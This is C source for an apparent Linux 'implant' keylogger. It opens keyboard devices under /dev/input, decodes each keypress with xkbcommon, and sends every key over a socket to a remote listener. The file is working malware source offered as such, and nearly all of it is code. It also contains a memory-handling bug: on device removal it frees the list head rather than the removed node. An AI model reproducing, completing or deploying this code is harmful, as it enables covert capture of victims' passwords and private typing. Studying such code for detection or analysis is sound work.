
#include <alloca.h>
#include <bits/types/struct_timeval.h>
#include <errno.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <sys/queue.h>
#include <sys/select.h>
#include <sys/types.h>
#include <unistd.h>
#include <xkbcommon/xkbcommon.h>
#include "implant.h"

static const translated_key_t KEYS[] = {
    {"space", ' '},
    {"comma", ','},
    {"period", '.'},
    {"slash", '/'},
    {"questionmark", '?'},
    {"semicolon", ';'},
    {"apostrophe", '\''},
    {"bracketleft", '['},
    {"bracketright", ']'},
    {"backslash", '\\'},
    {"pipe", '|'},
    {"Tab", '\t'},
    {"minus", '-'},
    {"plus", '+'},
    {"equal", '='},
    {"dollar", '$'},
    {"percentage", '%'},
    {"star", '*'},
    {"parenthesisleft", '('},
    {"parenthesisright", ')'},
    {"underscore", '_'},
    {"ampersand", '&'},
    {"pound", '#'},
    {"arobase", '@'},
    {"tild", '~'},
    {NULL, 0},
};

static int
get_highest_fd(implant_t *instance) {
    int highest_fd = -1;

    keyboard_t *it = NULL;
    TAILQ_FOREACH(it, &instance->kbd, devices) {
        highest_fd = (it->fd > highest_fd) ? it->fd : highest_fd;
    }
    return highest_fd;
}

static char *
check_translated_key(char *key_desc) {
    for (size_t ctr = 0; KEYS[ctr].description != NULL; ctr++) {
        if (!strcmp(KEYS[ctr].description, key_desc)) {

            memset(key_desc, 0, STRING_BUFFER_SIZE);
            key_desc[0] = KEYS[ctr].representation;

            break;
        }
    }
    return key_desc;
}

static int
log_keyboard(int fd, struct xkb_state *state, char **key_desc_ptr) {
    struct input_event evt = {0};
    static bool shift_pressed = false;

    /*
        read events out of /dev/input/by-path/${**}-kbd

    TODO:
        for now, we only read one, but we can attempt to read them in
        bulk of 6-10 once bufferizing messages is implemented
    */

    ssize_t bytes_read = read(fd, &evt, sizeof(evt));
#ifdef DEBUG
    DEBUG_LOG("[!] read %ld bytes", bytes_read);
#endif

    if (bytes_read != sizeof(evt)) {

#ifdef DEBUG
        DEBUG_LOG("[!] read() error: %s", strerror(errno));
#endif

        return ERROR;
    }

    /* checking is we are in MAJ key. TODO: check if CAPS_LOCK is enabled or not.
     */
    if (evt.type == EV_KEY && evt.value == KEY_RELEASED) {
        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
            shift_pressed = false;
            return SUCCESSFUL;
        }
    }

    if (evt.type == EV_KEY && evt.value == KEY_PRESSED) {

        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
            shift_pressed = true;
            return SUCCESSFUL;
        }

        /*
            TODO:

            1) add support for xlib as well, so that wayland AND xlib are
            supported. this should allow us to then relay those without issues

            2) add check for which library is installed & add abstraction layer
        */

        xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);

        if (shift_pressed)
            keysym = xkb_keysym_to_upper(keysym);

        memset(*key_desc_ptr, 0, STRING_BUFFER_SIZE);
        xkb_keysym_get_name(keysym, *key_desc_ptr, STRING_BUFFER_SIZE);

        *key_desc_ptr = check_translated_key(*key_desc_ptr);
    }

    return SUCCESSFUL;
}

/*
    main loop to listen for keys and stuff
*/
void keylog(implant_t *instance, int sockfd) {

    /* first set up select etc */
    int highest_fd = get_highest_fd(instance);
    fd_set rd, err;
    int status = 0;

    if (highest_fd < 0) {

#ifdef DEBUG
        DEBUG_LOG("[!] no keyboard found. exiting");
#endif

        return;
    }

    /*
       initialize xkbcommon context

       this is the stuff that allows us to map keys to
       the correct language & manages special characters, shift, etc.
    */

    struct xkb_context *context = NULL;
    struct xkb_keymap *keymap = NULL;
    struct xkb_state *state = NULL;

    context = xkb_context_new(0);
    if (!context) {

#ifdef DEBUG
        DEBUG_LOG("[!] error with xkb_context_new(): %s", strerror(errno));
#endif

        return;
    }

    keymap = xkb_keymap_new_from_names(context, NULL, 0);
    if (!keymap) {

#ifdef DEBUG
        DEBUG_LOG("[!] error with xkb_keymap_new_from_names(): %s",
                  strerror(errno));
#endif

        goto LOG_FUNCTION_CLEANUP;
    }

    state = xkb_state_new(keymap);
    if (!state) {

#ifdef DEBUG
        DEBUG_LOG("[!] error with xkb_state_new(): %s", strerror(errno));
#endif

        goto LOG_FUNCTION_CLEANUP;
    }

    char *key_desc = malloc(sizeof(char) * (STRING_BUFFER_SIZE + 1));
    if (!key_desc)
        goto LOG_FUNCTION_CLEANUP;

    memset(key_desc, 0, STRING_BUFFER_SIZE);

    /* run the damn loop */
    while (0x520) {

        /* setup FD-sets */
        keyboard_t *it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            FD_SET(it->fd, &rd);
            FD_SET(it->fd, &err);
        }

        /*
            check if a key has been pressed

            i really dont like this method because it means that everytime you
            press a key, a least 2 syscalls are ran (select & read)

            since we are buffering the keys anyway, why not poll for new events
            every n seconds & then call read() ? is there a risk of missing keys?
           tbd

            this select method works well for servers, but not really to poll new
           events
        */
#ifdef DEBUG
        struct timeval timeout = {0, 1};
        status = select(highest_fd + 1, &rd, NULL, &err, &timeout);
#else
        status = select(highest_fd + 1, &rd, NULL, &err, NULL);
#endif

        if (status < 0) {

#ifdef DEBUG
            DEBUG_LOG("[!] select error: %s", strerror(errno));
#endif

            goto LOG_FUNCTION_CLEANUP;
        }

        /* check file descriptors (first for error, then for new input) */
        it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            if (FD_ISSET(it->fd, &err)) {

#ifdef DEBUG
                DEBUG_LOG("[!] Error on file descriptor %d", it->fd);
#endif

                /* keyboard has been un-plugged, let's continue */
                FD_CLR(it->fd, &rd);
                FD_CLR(it->fd, &err);

                close(it->fd);

                /* making sure we dont have a memory leak here */
                void *tmp_ptr = &instance->kbd;
                TAILQ_REMOVE(&instance->kbd, it, devices);

                free(tmp_ptr);
                continue;
            }

            /* checking for new input here */
            if (FD_ISSET(it->fd, &rd)) {

                memset(key_desc, 0, STRING_BUFFER_SIZE);

                /*
                    should we really kill the run here or can we recover this ?
                    i need to run some tests before making a decision.
                */
                if (ERROR == log_keyboard(it->fd, state, &key_desc)) {
                    goto LOG_FUNCTION_CLEANUP;
                }

                if (ERROR == send_key_description(sockfd, key_desc)) {
                    goto LOG_FUNCTION_CLEANUP;
                }
            }
        }
    }

LOG_FUNCTION_CLEANUP:

    /* closing file descriptors if instance still exists */
    if (instance != NULL) {
        keyboard_t *it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            close(it->fd);
        }
    }

    close(sockfd);

    if (key_desc != NULL)
        free(key_desc);

    if (state != NULL)
        xkb_state_unref(state);

    if (keymap != NULL)
        xkb_keymap_unref(keymap);

    if (context != NULL)
        xkb_context_unref(context);
}
